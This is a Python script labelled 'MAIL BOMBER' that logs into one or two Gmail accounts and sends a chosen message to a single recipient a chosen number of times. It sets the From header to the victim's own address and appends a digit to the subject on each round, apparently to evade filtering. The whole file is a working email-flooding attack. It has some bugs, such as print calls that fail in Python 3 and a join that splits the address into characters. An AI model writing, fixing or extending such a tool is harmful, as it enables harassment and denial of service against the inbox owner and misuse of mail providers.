import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Some show...
print(' ')*3
print("MAIL BOMBER BY V01DS!!! USE IT WISELY!!!")
print(' ')*5

# Setting up default things
port = 587  # For starttls
smtp_server = "smtp.gmail.com"

# Taking the inputs from the user
sender_mail = input("Type your mail and press enter: ")
print(' ')

sender_pass = input("Type your password and press enter: ")
print(' ')

sender_mail2 = input("Type your second mail and press enter, don't type anything if you don't use a second mail: ")
print(' ')

sender_pass2 = input("Type your second mails password and press enter: ")
print(' ')

reciever = input("Type the reciever mail address and press enter:")
print(' ')

message = input("Type your message you want to send: ")
print(' ')

subject = input("Type the subject: ")
print(' ')

bomb_times = int(input("How many times do you want to send this mail?: "))
print(' ')

# Sending the mails 
def sendFirst():
    mail = MIMEText(message, "html", "utf-8")
    mail["From"] = reciever
    mail["Subject"] = subject
    mail["To"] = ",".join(reciever)
    mail = mail.as_string()
    try:
        server = smtplib.SMTP('smtp.gmail.com:587') 
        server.starttls() 
        server.login(sender_mail, sender_pass)   
        server.sendmail(sender_mail, reciever, mail) 
        print('Mail sent from the first account')
        
        
        
    except KeyboardInterrupt:
        print("An error has occured")
        
def sendSecond():
    mail2 = MIMEText(message, "html", "utf-8")
    mail2["From"] = reciever
    mail2["Subject"] = subject
    mail2["To"] = ",".join(reciever)
    mail2 = mail2.as_string()
    try:
        server = smtplib.SMTP('smtp.gmail.com:587') 
        server.starttls() 
        server.login(sender_mail2, sender_pass2)   
        server.sendmail(sender_mail2, reciever, mail2) 
        print('Mail sent from the second account')
        
        
    except KeyboardInterrupt:
        print("An error has occured")

if sender_mail2 == '':        
    while bomb_times > 0:
        sendFirst()
        subject = subject + str(1)
        bomb_times = bomb_times - 1
else:
    while bomb_times > 0:
        sendFirst()
        sendSecond()
        subject = subject + str(1)
        bomb_times = bomb_times - 2
